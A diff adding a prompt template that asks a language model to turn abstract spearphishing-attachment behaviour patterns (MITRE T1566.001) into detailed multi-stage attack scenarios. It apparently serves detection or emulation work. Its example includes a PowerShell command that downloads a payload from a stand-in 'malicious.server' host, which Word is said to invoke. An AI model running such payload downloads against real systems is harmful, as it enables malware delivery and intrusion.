@@ -1,0 +1,51 @@
+T — Task Type
+Generate multi‑stage attack scenarios from abstract behavior patterns.
+
+I — Instruction
+Based on the provided {stage2 output} for MITRE ATT&CK T1566.001 (Spearphishing Attachment), translate each behavior pattern into a detailed, multi‑stage attack scenario that maps user actions through all involved applications to final payload execution.
+
+D — Do
+
+Break the attack into numbered stages.
+
+For each stage, identify parent/child processes, user actions, and artifacts (files, URLs).
+
+Include realistic shell or PowerShell commands with comments.
+
+Show how applications (Outlook, Chrome, Excel, Explorer, etc.) hand off to one another.
+
+D — Don’t
+
+Don’t collapse multiple steps into a single bullet.
+
+Don’t omit network or file indicators needed for detection.
+
+Don’t use vague descriptions (“the payload runs”) without concrete commands.
+
+E — Examples
+
+Input snippet: {stage2 output}
+Expected snippet:
+
+Stage 1 – Email Delivery
+
+shell
+Copy
+Edit
+# Outlook spawns winword to open the attachment
+C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE "C:\Users\Alice\Downloads\invoice.docm"
+Stage 2 – Macro Execution
+
+powershell
+Copy
+Edit
+# Word invokes PowerShell to download payload
+powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri 'http://malicious.server/payload.exe' -OutFile 'C:\Temp\p.exe'"
+C — Content
+
+{stage2 output} (abstract behavior patterns)
+
+List of involved applications
+
+Any provided URLs, file names, macro code snippets
+
